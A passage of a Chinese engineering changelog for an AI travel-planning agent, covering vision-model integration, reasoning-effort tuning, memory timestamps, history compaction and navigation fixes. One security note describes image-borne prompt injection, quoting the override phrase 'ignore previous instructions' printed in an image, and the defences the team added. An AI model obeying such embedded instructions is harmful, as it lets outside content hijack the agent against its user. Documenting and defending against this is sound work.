社交页可读字号基线为说明/时间/标签 ≥11px、操作 ≥12px、正文 ≥14px，不再用 7.5–10px 制造层级。
坑见 `docs/pitfalls/推荐页不能先让用户面对空白搜索框.md`、
`docs/pitfalls/高分屏下精致小字会直接变成不可读.md`。

**Phase 84 — 统一通知中心与社交提醒**：顶栏铃铛合并社交通知与平台公告未读，显示数字徽标并
打开通知浮层。新增 `TravelNotification` 与 `/api/notifications` 列表/未读/单条已读/全部已读接口；
好友申请、好友接受、接力反馈在原业务事务内写通知。稳定 `dedupe_key` 保证同一用户对同一接力的
反馈切换只更新一条，取消反馈或删除目标时同步撤销；所有读写按当前用户隔离。点击好友通知直达
好友页，接力通知直达对应目的地；未读数每 30 秒及窗口聚焦时刷新。坑见
`docs/pitfalls/事件通知必须与业务同事务且按事件去重.md`。

**Phase 105 — 视觉模型接入**（DeepSeek `deepseek-v4-flash-vision-exp`，当天上线）：
**接它不是为了「更快」**——抓页面的时间大头是导航那 30 秒，跟用什么方式读页面无关，而被
替换掉的 `_snapshot_to_text` 恰好是链路里唯一零成本的一步（Phase 96）。接它是为了**补信息
漏洞**：小红书是图片媒介，实测 4 篇样本里 1 篇的 desc 是**纯话题标签**（`#杭州[话题]#…`，
零信息），而它的图里有完整的景点+票价+开放时间表——我们花 75 秒预算抓回来，最值钱的部分
一个字没读。
① **`LLMClient.parse_image`**（`app/agent/vision.py` + `llm/client.py`）：复用 `parse()` 的
schema 校验与传输重试（Phase 103），**强制 `response_format=json_object`**。⚠️ 这是**性能开关
不是格式讲究**：同为 max_tokens=3000，裸 prompt 空正文 2/6、延迟中位 23.7s、out 中位 2622；
json_object 下 **0/6、7.4s、743**。prompt 里**已经写了** Phase 101/102 那套思考纪律，
**它照样烧满**——这是第四次撞 DeepSeek 思考模式过度推理（11/101/102/本次），也是头一次
「写纪律」失效。**推论：能用协议层约束（response_format/schema）的地方就别写规矩；加预算不是
治法**（1600→3000 只让它想得更久）。坑见
`docs/pitfalls/视觉输入下思考链要靠json模式刹车.md`。
② **小红书图抽取**：接在 `_collect_xhs` 末尾。**只对 desc 信息薄的笔记跑**（`desc_is_thin`，
话题标签先剥再数长度）——样本里 3/4 的 desc 本身是干货、看图纯浪费，按这条过滤成本降 ~75%
且精准命中收益点。自己的预算 + **部分收成**（照搬 Phase 102）。⚠️ **小红书图 URL 有效期不到
30 分钟**（实测 40 分钟前取得的已 403，库里 660 条历史 URL 全部 403）——所以只能在采集当时做，
复用旧来源那条路径天然不跑视觉（URL 必然已死）。**配图失效一事用户决定不管**。
实测浏览器道**始终是长杆**（272/208/457s vs xhs 96/120/96s），故**零墙钟增量**。
③ **页面类型判定：对照通道，不替换**。⚠️ 只在**规则快判拿不准**时才跑——多数内容页命中
Phase 11 的「正文>1500 字直接判 content」，文本侧是 **0 秒**，此时并行跑视觉是净增 1.4s/页
（8 页 +11s）；而已知误判恰好在模型兜底这一档（知乎返回 55 字 JSON 错误页 → 文本判 `content`
放行、视觉判 `error`）。为此把规则段抽成 `_rule_page_type`。不一致**只记 warning、仍以文本判定
为准**——文本判定是 Action Guard 三层守卫的一环、跑了很久，攒够数据再决定谁说了算。
④ **对话框上传图**：复用 Phase 74 的上传设施（magic byte 探测、边读边判大小、uuid 文件名、
`GET /api/uploads/{id}` 故意不鉴权因为 `<img>` 不带 header）**一行未改**。`image_ids` 进
`SendMessageRequest`，`_own_image_ids` 做**归属校验**（那条 GET 的防护本来只靠 id 不可枚举，
这是第二道、真正按用户隔离的那道）。⚠️ **首页 `unified-start` 与对话框 `Composer` 是两个组件，
两处都要加**——第一版只加了 Composer，而用户最想用它的地方恰恰是首页（漏了被当场发现）；
首页还要放行「只传图不打字」，否则会被 `!prompt` 拦下。
**安全**：**图片输入绕过 Phase 69 的全部文本防线**（`wrap_external`/`EXTERNAL_POLICY` 都作用在
文本上，一张图里印着「忽略之前的指令」是直接进模型的）。两层防——schema 只让模型往固定字段填
数组；产出一律过 `wrap_external`（`source=note_image`/`user_image`，审计时能分清哪些内容是模型
「看」出来的）。
**关于「agent runtime 要不要更开放」（用户问的架构问题）——结论：开放输入端，不动控制流。**
想换开放式 agent 的话**我们已经有了**，就是 Phase 21 的 deep_research，而它的教训写在上面：
弱模型挥霍浏览器超时，只能靠 system_prompt 的硬性资源纪律硬压。固定流水线换来的可预测/可观测/
可停止/checkpoint 续跑/部分收成是 Phase 14/16/101/102 一路攒的，不该为「更开放」丢掉。所以
本次是**图 → 结构化文本 → 走现有路由**，不新增图片链路。**真正该放开的两处留作 Phase 106
单独立项**：`Preference` 的来源（现在只从文本解析，一张行程截图包含全部字段）、路由的判别力
（`resolve_route` 只看文本，而意图可能藏在图里）——等有真实使用数据再定，用户传什么图、
传图时想干什么，猜不如看。
**线上验证**：只上传一张大阪行程截图、`content=''` → 8s「正在看你发的图」→ 24s 高德定位**大阪**、
32s 携程定位**奈良**（多城都从图里读出）→ 369s 产出「大阪·奈良3日行程」，Day1/2/3 完全对应
图里内容；与基线（苏州 360s）同量级。计划 `docs/task_plans/视觉模型接入-2026-08-21.md`，
用例 `docs/test_cases/视觉模型接入-验收用例.md`（后端 25 + 前端 6）。

**Phase 108 — 协议层思考控制（`reasoning_effort`）**（读 `deepseek-ai/deepseek-harness` 上游
854 commits 后的改造；**本条最值钱的不是结论，是三次错误结论的成因**）：
DeepSeek 思考模式对结构化抽取过度推理，我们撞过四次（Phase 11 ITINERARY / 101 quick_take /
102 五处抽取 / 105 视觉），治法一路是 prompt 纪律 + 借 `response_format` 刹车——**都是间接的**。
上游 `226600147e feat(llm-deepseek): support low reasoning effort` 暴露了对症手段：DeepSeek 有
直接定思考档位的协议字段，而我们全仓 `grep reasoning_effort` 是 **0 处**。
① **协议映射**（抄自 `llm-deepseek/src/serialize.ts::resolveThinking`，`_thinking_kwargs`）：
`off` → `{"thinking":{"type":"disabled"}}` **不带** `reasoning_effort`；`low/high/max` →
`{"thinking":{"type":"enabled"}, "reasoning_effort":<档位>}`。⚠️ **`off` 不是 wire 档位**，
发 `reasoning_effort:"off"` 是错的（单测钉死）；`thinking` 不是 openai SDK 已知参数，必须走
`extra_body`（SDK 把它并到请求体**顶层**，正好满足协议）。三个模型实测均生效。
② **分档判据不是「抽取 vs 生成」，是「输出里有没有模型要*推导*出来的数字」。**
机械档（`off`）= 输出只有照抄的名字/天号：ontology 逐日分块(`TripDaysExtraction`)、
poster(`PosterData`)、trip_api 逐日分块(`TripImportDays`)。判断档（`none`）= 含推导数字：
profile/itinerary/cost、budget、trip_api 摘要(带 `budget_items`)——「两大一小=3」「2人合计→人均」
「区间价取中间值」都是推导。`parse()` **刻意不读全局配置**：需求解析/自检 critique/记忆增删
同样走它但质量依赖推理，全局默认会让将来新增的调用**静默**继承一个它不该有的档位。
③ **判断档不许降到 off——数据打出来的，不是保守起见。** `extract_eval` 5 篇固定攻略：
分档 3 轮 0 失败 / 全 `off` **10 轮 5 失败**，且失败**不是小瑕疵是整块内容消失**且可复现：
马来西亚 **Day 6 整天丢失 2/4 轮**（那天正文里正好有「路线A/路线B」二选一分支）、武汉一轮
Day 2/3 无停留点且**黄鹤楼**完全没抽到。**关掉思考链，模型对「要读懂结构才能抽对」的段落
会直接跳过。** 代价是分档只比基线快约 7%（555.6s vs 596.5s，噪声内）——**有意接受：
提速的前提是不丢内容，不是反过来。**（全 `off` 是 62.5s，9.5×，但那 9.5× 买不起。）
④ **三次错误结论全部出在判据设计上，被测系统一次都没骗人**——这才是本 Phase 该留下的东西：
**(a)** 探测脚本用「与基线相同 → 字段被静默忽略」判生效，把 `high` 误报成失效——**`high` 就是
默认档**，两个假设在这一档上观测不可分（坑：`用与基线相同来判定字段未生效会误报默认档.md`）；
**(b)** 量召回率时测了 `poster._extract_poster_data`，那是注释写明的**回退路径**——本体架构下
海报/预算/导入命中 `ensure_trip_object` 缓存时**零 LLM 调用**，真正受影响的只有**第一次抽取**；
同一探针**只数 `stops`**，而「漏掉」的全是餐馆茶馆，它们只是被归进了 `foods`——**分类差异
被读成数据丢失，结论正好相反**（坑：`量召回率时测错了层也数错了筐.md`）；
**(c)** 修正后的探针得出「`off` 召回更高（64.4% vs 51.1%）」并差点据此全开——那是**只测玉树
一篇**的单样本外推，而失败恰恰出在另外两篇。**实验设计的错误不会报错，只会给你一个像模像样
的数字。**
⑤ **人数单独一路兜底**（`HeadcountExtraction` + `_headcount()`）：人数是唯一实测会被 `off`
弄错的字段（11 次里错 1 次，认成 1 人），同时是整份抽取里**最便宜**的一个数，而错了会顺着
「金额一律人均口径」（Phase 67）把整个预算面板一起弄错**且不报错**。`max_tokens=200`、只喂正文
头尾、**永远走 `headcount_reasoning_effort`(none) 不跟提速旋钮**、与主路并发不在关键路径、
只在跑 cost 路时启用；合并用 `max()`——**观测到的失手方向是偏小**，max 天然防小。
⑥ **抽空的路不许登记**（与档位无关的**既有**缺口，本次最有价值的连带发现）：评估抓到一次
5 天攻略抽出 **0 天 0 点**而 `lanes` 仍写 `cost+itinerary` → 被 `save_trip_object` 缓存、
`source_hash` 不变就**永不重试**，用户看到一个永远空白的行程板重开也没用。针对性重跑 8 次
未复现，**不能归因给 `off`**：原来的 `done` 只排除**抛异常**的路，「调用成功、返回空数组」照样登记。
修法是对旧决策（「抽不出东西的攻略也要缓存，否则每点一次白抽一遍」）的**细化而非推翻**——
判据从「抽出来是空的」改成「**正文里本来就没东西可抽**」：没有 Day 标题的正文抽不出地点是
正常结果照旧缓存；**有 Day 段落却抽出 0 点是故障，不登记、下次重试**。代价不对称：多抽一次是
几秒几分钱，固化一次是这份攻略永久废掉。
**回退**：`.env` 设 `EXTRACT_REASONING_EFFORT=none` → 请求体与改造前逐字节相同。
计划 `docs/task_plans/抽取链路改用协议层思考控制-2026-08-24.md`，用例
`docs/test_cases/抽取链路协议层思考控制-验收用例.md`
（`test_reasoning_effort.py` 24 + `test_ontology.py` 52，全量 1361 passed）。

**Phase 107 — 首页配色收敛 + 现代/水墨双主题**（纯前端，两件事一条线）：
① **换主色花了五轮，教训在第一轮**：首轮把蓝紫描边换成松绿、暖黄中性色降饱和，token 和色值
确实全变了，上线截图给用户看——**「还是这个颜色」**。根因是**整体色彩印象由大面积背景 + 主行动色
+ 深色大块 + 强调色共同决定**，只改边框和明度等于没改。后四轮才逐步把中性色温（暖黄纸→冷白蓝灰）、
主行动色（松绿→海岛蓝 `#176F89`→皇家蓝 `#2563EB`）、深色大块（接力横幅绿褐炭墨→纯蓝）、
强调色（暗朱砂→珊瑚橙且只留品牌图标等极小面积）一起换掉。中间那轮 `#176F89` 是**偏绿的青蓝**，
加上云白横向高光 + 描边 + 投影，标题看着像霓虹立体字——**浅色背景上给渐变文字加描边托笔画，
代价是整个字失去平面感**，最后删干净只留纵向渐变。⚠️ **留了债**：token 演进堆出三层别名
`--x-sky-*`（真正色源）← `--x-ocean-*` ← `--x-pine-*`（兼容别名，全站引用最广），有意不做大范围
重命名以免在改色之外再引入回归——但下次动配色**先收敛别名**，否则实现与命名会继续互相误导。
关键文字对比度静态核对：正文 `15.03:1`、次级 `5.12:1`、主按钮 `5.72:1`、眉题 `4.73:1`、
接力横幅正文 `7.86:1`。坑见 `docs/pitfalls/调色阶不等于换掉整体色彩印象.md`、
`docs/pitfalls/层叠规则残留透明文字会吞掉新颜色.md`（**渐变文字改普通文字时那四个声明是一组**：
`background` / `background-clip: text` / `-webkit-text-fill-color` / `color: transparent`。
`.hero-eyebrow` 只删了 `background-clip`，同一规则块里位置更靠后的 `color: transparent` 就把新
文字色盖掉了——**设计意图正确、选择器命中、computed style 仍是透明，且不报任何错**，品牌短句
直接隐形）。
② **双主题切换**：顶栏视图切换旁加单按钮 `现代主题 ⇄ 水墨主题`（`aria-pressed` 暴露状态，
移动端隐藏文字保留可访问名称），选择写 `localStorage.travel_theme_mode`。`initialThemeMode`
（`interaction.ts` 纯函数）**只认 `'ink'`，其余一律回落 `modern`**——localStorage 是用户可写的，
非法值必须有确定归宿。实现是根节点 `theme-${themeMode}` class + `.theme-ink` 覆盖层
（宣纸中性色、楷体实心墨题、浓墨渐变主按钮、朱砂 focus、侧栏/接力横幅/热门卡片），
**不动 DOM 结构、不动布局**。⚠️ 坑见 `docs/pitfalls/主题切换必须覆盖品牌图标.md`：
`.brand-mark` 默认吃 `--x-cinnabar`，而水墨主题的覆盖值**也是朱砂**——选择器命中了、规则存在，
两个主题最终颜色一模一样，图标始终不变。**双主题的测试必须比对两个主题的最终语义值；
断言「存在主题覆盖规则」证明不了视觉真的切换了。** 背景图只在空状态首屏做低对比度氛围，
原始 2.8MB PNG 转 **WebP q80 → 161KB（-94%）**（同 Phase 80 天堂寨主视觉的做法）。
计划 `docs/task_plans/首页配色视觉收敛-2026-08-24.md`、`docs/task_plans/双主题切换与水墨主题-2026-08-24.md`，
用例 `docs/test_cases/首页配色视觉收敛-验收用例.md`、`docs/test_cases/双主题切换与水墨主题-验收用例.md`
（`frontend/tests/` 87 passed，新增 3 条：主题存储回落 / 皇家蓝配色契约 / 双主题入口与资源）。

**Phase 108 — 记忆时间戳语义修复：把「最后注入」从「最后更改」里拆出来**（线上 bug）：
`travel_memory.updated_at` 声明了 `onupdate=_now`，而 **SQLAlchemy 的 `onupdate` 对该行的任何
UPDATE 都生效、与改哪一列无关**——于是 `_bump_hit_count` 这处**纯记账写**（每轮给被注入的记忆
`hit_count += 1`）把 `updated_at` 一路推到当下。结果：**该列的实际语义是「最后一次被注入」，
而全系统按「内容最后一次变化」在读它**。最贵的一处是 `format_memories_block` 贴进 prompt 的年龄
标签——Phase 30 专门为**触发模型的过期意识**而建（docstring：「『47 天前』比裸时间戳更能触发
过期意识」），修复前一条记忆只要上轮被注入过这轮就标「今天」，**越活跃的用户偏得越狠**：
一年前说的「爱吃辣」和今天刚说的，模型看到的一模一样。线上 **25/47 行**受影响
（某用户 7 条全是「建于 25 天前、prompt 写 2 天前」）。第二处：`_should_sleep_consolidate` 数
「距上次整理后**变更**数」用的也是它，注入即计数 → 门控退化成「聊过天就整理」，而
`consolidate_memories` 是 LLM 整篇重写后**整体替换**，**每次都是一次有损传递**（同 Phase 103 对
history summary 的判断）。修法：`last_used_at` 新列承接记账时间，`_bump_hit_count` 改 Core
`update()` 并把 `updated_at` **显式列进 SET 子句自赋值**（onupdate 只在列不在 SET 里时套用），
顺带 Python 侧读改写换成 SQL 自增（direct 链路不过浏览器池，并发轮次会丢计数）。
⚠️ **2026-08-24 是 `travel_memory.updated_at` 的语义断点**，此日之前的值不可用于任何分析——
内容变更时间从来没被任何地方记录过，**不可恢复**；回填取保守下界 `created_at`（偏老只是让模型
多问一句，偏新会拿一年前的口味当今天的，同 Phase 104 的不对称代价判断），回填**靠
`last_used_at IS NULL` 谓词幂等而非靠"只跑一次"**——那整块 DDL 将来每加一列都会重跑。
**同批修掉第二扇门**：`consolidate_memories` 是**删旧建新**，用户点一次「✨ 整理记忆」，
半年前的偏好就变成「建立 刚刚 · 最后使用 从未」——刚修好的问题原样回来（线上已有 2 个用户
整理过）。改为**按 key 继承**（key 是 Phase 17 归槽的主键，也是 N→M 合并时唯一不含猜测的
祖先映射）：`created_at`/`hit_count`/`last_used_at` 继承祖先；**内容一字未改则 `updated_at`
保持原值**（整理常常只是原样带过某个 key，那不是内容变更）；`explicit` **只升不降**（`or`，
对齐 `_upsert_by_key` 的粘性）——LLM 只看得到内容、**判不出用户当初是不是亲口说的**，而
`CONSOLIDATE_SYSTEM` 还让它「拿不准填 false」，不继承等于每次整理都在悄悄剥夺 Phase 17 的
「明确表达优先」（weight 2.0→1.0 且丢掉「explicit 始终注入」的保底）；无 key 的旧行历史只能丢
（硬猜比丢更糟）。前端记忆面板把**建立 / 更新 / 最后使用**三个时间分开显示（`formatMemoryAge` 新纯函数，
不复用 `formatLastSeen`——它 30 天以上一律「很久以前」，而记忆的价值恰恰在于分辨 25 天和 300 天）。
⚠️ **两个方向的测试缺一不可**：只钉「记账时不动」的话，把整列 `onupdate` 删掉也能过
（变异检验：删自赋值→红 2 条，删 onupdate→另红 2 条）。**预期行为变化不是回归**：活跃用户的
记忆在 prompt 里从「今天」变成真实年龄，模型开始对陈旧偏好起疑**正是 Phase 30 的设计意图**。
**刻意不做**：不移植 mneme 的记忆热度衰减——线上单用户最多 8 条，`memory_max_rows=40` 与
`memory_select_threshold=12` **都从没触发过**，Phase 17 的归槽（一个 key 一行）已经把「无限累积」
解决在更前面；重新有价值的触发条件是模型大量自造 canonical 集合外的 key、单用户越过 12 条。
不改 `load_memories` 排序（`hit_count` 在全量注入下同一用户恒等——线上 6 条全是 84，它记的是
轮数不是相关性；改排序会牵动注入内容，单独评估）。坑见
`docs/pitfalls/记账写会连带刷新updated_at.md`（**`onupdate` 是行级不是列级**：凡表上有与内容
无关的记账列 hit_count/last_seen/view_count/retry_count，都会污染同表 `updated_at`），计划
`docs/task_plans/记忆时间戳语义修复-2026-08-24.md`，用例
`docs/test_cases/记忆时间戳语义修复-验收用例.md`（`tests/test_memory_timestamps.py` 19 +
`frontend/tests/interaction-utils.test.mjs` 90 passed）。

**Phase 106 — 删掉滑动窗口 + 记忆变更三态**（读 `openai/codex` 上游后的两处改造，
一处删、一处加，都对着具体缺口）：
① **装配期滑动窗口移除**（`_assemble_history`）。Phase 91 已经把历史压缩做成
「只追加日志 + `derive_surface` 投影」，但 Phase 34 留下的 `msgs[-history_rounds*2:]`
没跟着删——同一条链路上**两套互不知情的压缩**。它砍掉的消息**没有摘要覆盖、无任何
记录**，而 `update_history_summary` 是轮末旁路、失败只记日志（Phase 103 刚给传输层加
重试正说明这类失败是常态）：旁路一旦失败，下一轮就静默丢最早那 1-2 条，用户说的约束
当轮蒸发，**下一轮又会自愈**——偶发、单轮、自愈、无日志，事后完全无法复现。另外两笔
账：超限后窗口每轮左移一格，`history_msgs` **开头就变**，Phase 58 费力保住的前缀缓存
从头部作废；`context_manifest` 的 docstring 早点名过「改 `history_rounds` 会追溯性
移动边界」。现在**唯一能改变模型可见边界的动作是折叠，而折叠一定在日志里留一条
`replace`**；超限时**就地补一次折叠**再重投影（⚠️ 与 Phase 103「压缩挪出关键路径」
不冲突：那反对的是**无条件**每轮花 2-5s，这里只在「否则就要丢消息」时触发，稳态永不
进入）。连带修 `update_history_summary` 的一个洞：它在 `len(live) <= keep` 处早退，
所以**近窗自己就超字数**时永远折不动 → 装配端只能靠紧急降级丢消息，等于滑动窗口原样
回来；现改为按字数**收窄 keep**。真丢消息的紧急路径保留但必打 `ERROR`——**可以丢，
不可以静默**。⚠️ 测试 fixture 的 `created_at` 必须早于 `now()`：`replace` 行用 DB 默认
时间且不允许遮蔽自己之后的消息，种子数据用未来时间戳会让遮蔽区间**静默失效**
（现象是「折叠了但历史没变短」）。
② **记忆变更三态通知**（移植 Codex `PreviousSectionState`）。**先说不搬什么**：Codex 的
World State（系统上下文变成追加进历史的增量消息、RFC 7386 merge patch 存快照）解决的是
「每轮重拼 system prompt → 前缀全废」，而我们是**投影架构**（prompt 是日志的投影，记忆
每轮现算），历史里**没有陈旧副本**，所以它那套 `REPLACEMENT_NOTICE` 消歧大半用不上；
缓存那半 Phase 58「易变项末置到 user」已经解决。把记忆挪进历史前缀只省约 800 token 的
缓存折扣，却要引入旧副本+失效通知+压缩时 baseline 重置，**不划算，不做**。
**但有一格是真缺口**：投影消灭了记忆块的旧副本，消灭不了**对话历史本身承载的旧状态**
——第 3 轮因「忌口=素食」推了一堆素食馆（那段回复逐字留在历史里），第 8 轮用户说
「不忌口了」删掉记忆，第 8 轮 prompt = 满屏素食推荐 + 没有忌口的记忆块，模型**收不到
任何信号**。这正是 `agents_md.rs` 的 `(None, previous_may_contain_instructions=true)` 格。
三态取自「上一轮实际注入了什么」（此前完全没记录，`memories_used` 只有 type/content
**没有 key**）：Absent（本会话无终稿回复）→静默；Unknown（有回复但没记下/老格式无 key）
→发一句整体重申；Known→精确 diff。三条硬约束：**新增不通知**（不与历史矛盾，说了是
噪声，同 Codex `(Some, previous_absent)` 那格）；**「本轮没被 `select_relevant_memories`
筛中」绝不能报成删除**——判据取**筛选前**的全量 key，写错的话一次相关性筛选就让模型
以为用户撤回了偏好，那是**主动误导，比不通知更糟**；**Unknown 往「通知」这边倒**
（代价不对称，同 Phase 104：多说一句几十 token，漏说则模型继续按已被推翻的约束作答）。
读失败**保持静默**而非发 Unknown 那句——DB 抖动是基础设施问题，不是「拿不准说过什么」。
计划 `docs/task_plans/移除历史滑动窗口-2026-08-22.md`、
`docs/task_plans/记忆变更三态通知-2026-08-22.md`，用例
`docs/test_cases/移除历史滑动窗口-验收用例.md`、`docs/test_cases/记忆变更三态通知-验收用例.md`
（`test_history_window_removal.py` 12 + `test_memory_tristate.py` 14 passed）。

**Phase 104 — 导航把整片东南亚判成「境内」**（线上 bug）：马来西亚仙本那的酒店点「🧭 导航」
开的是**高德**，而高德没有当地数据 → 地图停在北京 + 「服务超时」。根因是 Phase 100 的
`out_of_china()` 用**单个经纬度矩形**（`73.66<lng<135.05 and 3.86<lat<53.55`），纬度下界
3.86N 把整片东南亚圈了进来：仙本那(4.48N)/亚庇(5.98N)/曼谷(13.75N)/河内(21.03N)/马尼拉(14.60N)
全部误判，而**同一个行程里吉隆坡(3.14N)判对、亚庇判错**——分界线恰好从中间穿过。两个后果同源：
① 选错地图；② `gcj_to_wgs84` 对本就是 WGS-84 的海外坐标（Phase 62：海外走 Open-Meteo/GeoNames/
Photon）再减一次偏移，**凭空偏 ~380m**。讽刺的是 `geocode.coordinates_probably_overseas` 的
docstring 早写着「粗边界**只用于决定是否调用国内路径 API，不用于判定坐标正确性**」——Phase 100
恰恰拿粗边界做了需要正确性的判断。**矩形从根本上做不到**：河内(21.03N,105.85E) 与南宁
(22.82N,108.37E) 靠得太近，任何轴对齐矩形都分不开越南北部与云南/广西。改用**简化国界多边形 +
射线法**（~50 顶点常量 + 海南/台湾补框，纯常量零依赖零网络，边界几公里误差无所谓）。
⚠️ **误判方向的代价不对称，拿不准时要判「境外」**：境外→境内 = 开高德、没数据、彻底不可用；
境内→境外 = 开苹果地图，而苹果在中国大陆用的正是高德数据、仍然可用。（原实现的注释把这个方向
**写反了**，所以包围盒才越取越松。）② 还有第二个缺口：`pickNavUrl` 只在 `!domestic && isApple`
时用苹果，**境外 + 非苹果（Android/Windows）仍落回高德**——只修境内外判定的话，bug 在半数设备
上依旧。现在境外非苹果走**谷歌**（后端新增 `nav.google`，与苹果同一份 WGS 坐标；老数据无该字段
时退回苹果，**绝不回高德**）。国内打不开谷歌是事实，但导航的真实使用场景是人到了当地，且相比
「高德显示北京」，「打不开」至少不是错误信息。测试用**跨境城市对照表**钉死（21 个境外 + 25 个
境内，每条陆地边界两侧各取真实城市，重点是矩形做不到的中越/中老/中缅/中泰边境带；喀纳斯在
多边形第一版里被切掉过，已并入用例）。计划 `docs/task_plans/导航境外误判修复-2026-08-21.md`
（`tests/test_nav_links.py` 84 passed、`tests/interaction-utils.test.mjs` 40 passed）。
**刻意不做**：不加 `travel_trip_stop.country_code` 列——坐标系与国别本该是数据的属性、在地理编码
时就该落库（`GeocodeContext.country_code` 那时拿得到），事后从坐标反猜是二等做法；但
`stop.location` 有 **8 处写入点**，逐个透传改动面大易漏，而多边形零迁移、**对存量行程立即生效**
（用户当前这个行程不用重新定位就好了）。留作后续结构性改进，届时多边形降级为缺 country 时的兜底。

**Phase 103 — 借鉴 opencode 的四处改造**（扫 `~/Desktop/opencode` 上游仓库后挑的，
每处对着一个具体缺口，不是「它有我们也来一个」）：
① **轮末压缩挪出关键路径**：`update_history_summary` 无返回值也不进 meta，与终稿**没有数据
依赖**，却是一次同步 v4-flash 调用（2-5s）——排在 `_finalize_streaming_message` 前面时，这几秒
里流式消息还挂着 `streaming=true`、前端还在转圈，而用户早就把攻略读完了。guide/direct 两处挪到
终稿之后，与 research 链路（本来就是对的）对齐。⚠️ `extract_and_save` **有**依赖（`saved` 进
`meta.memories_saved`）必须留在前面，有回归测试钉住；顺序断言用 `rindex` 而非 `index`——
`_finalize_streaming_message` 在取消分支里也出现一次，比对首次出现会让断言变成**永真**。
② **摘要提示词补两条纪律 + 标签分区**（抄 opencode `core/session/compaction.ts` 的
`SUMMARY_UPDATE_INSTRUCTIONS`）：旧摘要此前是裸的「（此前的摘要）」前缀混在原文 listing 里，
而 `HISTORY_SUMMARY_SYSTEM` 从头到尾没提过它的存在——模型既不知道它**即将被丢弃**，也不知道
它比下面的对话更老。我们的压缩是「**增量范围 + 全量重写**」（范围上只折叠掉出近窗的早期消息，
近 5 轮永远逐字；产物上每次整篇重写去顶替旧摘要），正因为是全量重写，「没写进新摘要就永久
丢失」才字面成立——20 轮会话里最早那条约束已被逐轮重写过好几遍，每遍都是一次有损传递。现在
`<prior-summary>` / `<conversation>` 分块，无旧摘要时**不出现空标签**，旧摘要过 `_strip_tag`
防穿透（同 Phase 69 ④）。原有四小节模板不动——「已排除的选项+原因」opencode 都没有，是防复读机的。
③ **LLMClient 传输层重试**（`app/llm/retry.py`，移植自 opencode `session/retry.ts`）：改造前全仓
`grep tenacity|max_retries|APIError|RateLimit` 是 **0 结果**——`parse()` 里那个 `for _ in range(2)`
只治「JSON 不合法」，传输错误一次都不重试，而一轮 guide 要打 6-10 次 DeepSeek，**任何一次撞上
429/503/连接重置整轮 4-6 分钟直接作废**。现在：错误文本正则兜底（SDK 的 isRetryable 常漏标）、
5xx 一律重试、优先读 `Retry-After`/`retry-after-ms`、指数 2s×2ⁿ + 25% 抖动、无头封顶 30s、最多 5 次、
**context overflow 永不重试**（判定顺序是**先看不可重试**，否则一条含 5xx 数字的 overflow 报文会被
放进循环）。两条我们独有的约束：**退避必须可被停止打断**（切 0.5s 片轮询 `is_cancelled(cid)`，
裸 sleep 会让停止在退避窗口里失灵）、**流式只在还没吐出任何内容时重试**（`produced` 标志——已 yield
过 delta 就重开流的话，用户会看到「攻略写到一半又从头写一遍」）。顺带 OpenAI client 加显式
`llm_timeout_s`(180)，默认 600s 等于没有。**刻意不做**：不上 tenacity（判断全要自定义，装饰器帮不上）；
暂不把重试状态推给前端（opencode 的 `policy()` 会 `set({attempt, next})` 让 UI 显示「12 秒后第 2/5 次」，
跟 Phase 71「静默空隙才是流失原因」对味，但要动 `_progress` 调用链和前端渲染，下一步做）。
④ **来源全文落库 + 多轮按需重取**（`app/agent/source_pages.py` + `travel_source_page` 表）：
`_search_and_collect_queries` 此前是 `"summary": _excerpt(page.text)`，1500 字摘录进 sources、
`page.text` 抓完即弃；而多轮复用分支复用的**就是这 1500 字**——用户追问「第 3 家酒店的取消政策」
时信息在原页面有、在我们手上没有。**深度研究链路早就解决了**（`research_tools._stash_source` 存全文
+ `read_source(id, offset)` 按需取），guide 链路缺的就是这一半。现在全文入库（`(conversation_id, url)`
唯一、上限 40000 字、每会话留 24 页），`sources` 带 `page_id`，复用时 `refresh_reused_summaries`
按**本轮**关键词重取窗口。**重取只发生在复用路径**——采集期仍是无关键词的 `_excerpt`（相关性裁剪
依赖调用上下文会破坏幂等，Phase 96 的教训）；未命中/无 page_id 一律退回旧 summary，**降级方向
永远是「和改造前一样」**。⚠️ **上线实测后 `source_focus_enabled` 默认置为 False**：真实数据
（6 页杭州来源 × 4 类追问）逼出三道防线——① **泛词筛除**（「酒店」在酒店页出现 18 次、最早那次
在标题里，用它定位窗口全是导航菜单，比原摘录还差；单页内词频就是天然 IDF，按**密度**判，
≤2 次一律放行）② **跳过页面头部** `min(400, len//4)`（a11y 快照前几百字必然是标题+主导航；
⚠️ 这跟 Phase 96 批评的「按位置下刀」**方向相反**：那是按位置**取内容**，这是按位置**排除已知
无价值区域**）③ **导航块闸门**（产出短行占比 >60% 判为菜单块整体弃用，同 Phase 96「过度裁剪
检测」手法）。三道防线把「误替换成导航文本」压到 **0**，但也几乎不触发——22 未命中 / 2 命中，
而那 2 条还是新闻列表和一条评论回复，**与提问语义无关**。**根因不是阈值，是方法的天花板：
关键词命中 ≠ 语义相关**，而 a11y 快照里正文与导航交织、没有结构信号可用。要真解决得上语义检索，
而 DeepSeek 无 embedding 接口（Phase 4 记过）。**全文落库照常进行**——数据在手上是将来任何检索
方案的地基，零风险；重取代码与 33 条测试保留，条件成熟（有干净正文提取，或引入 embedding）
再开。**教训：先落数据、后落算法，两者的把握度完全不同。**不复用 `travel_page`（那是 Phase 1 的 task 维度，塞会话来源要把两个外键
都置空）；不上向量检索（一个会话几十页，关键词窗口够，同 Phase 4 对记忆检索的判断）。
**明确不做**：**Context Epoch**（`core/system-context/index.ts` 把系统提示建模成一组可独立刷新的
typed source，变更以 mid-conversation system message 追加而 baseline 永不改写，让前缀缓存永不失效）
——设计漂亮，但要加 snapshot 列、给每类记忆写 baseline/update/removed 三个渲染器、还要处理
`unavailable`（观测失败时保留旧值而非当成"被删了"，最易写错）；收益是优化、成本是新状态机+迁移，
**单独立项**（理由同 Phase 102 对跨用户目的地缓存的判断）。
坑见 `docs/pitfalls/两层重试嵌套会把次数变成乘积.md`（内层 5 次 × 外层 5 次 = 36 次请求，
被「断言总请求数」的用例当场抓到；只断言「抛了异常」的话 36 和 6 表现完全一样）、
`docs/pitfalls/中文按连续汉字块取关键词等于没切词.md`（`[一-鿿]{2,}` 把整句抓成一个 token，
`str.find` 永远命中不了且**不报错**）。计划 `docs/task_plans/借鉴opencode的四处改造-2026-08-21.md`，
用例 `docs/test_cases/借鉴opencode的四处改造-验收用例.md`（69 passed）。

**Phase 102 — xhs 部分收成 + 抽取思考纪律**：两个实测驱动的小改动。① **部分收成**：
`collect_xhs_sources` 总预算超时原本**全丢**（`return []`）——线上实测一轮 xhs 各段合计 149.9s、
预算 150s，**差 0.1 秒就白等两分半一篇不剩**。现在内层往调用方传入的 `sink` 逐篇追加（每篇是
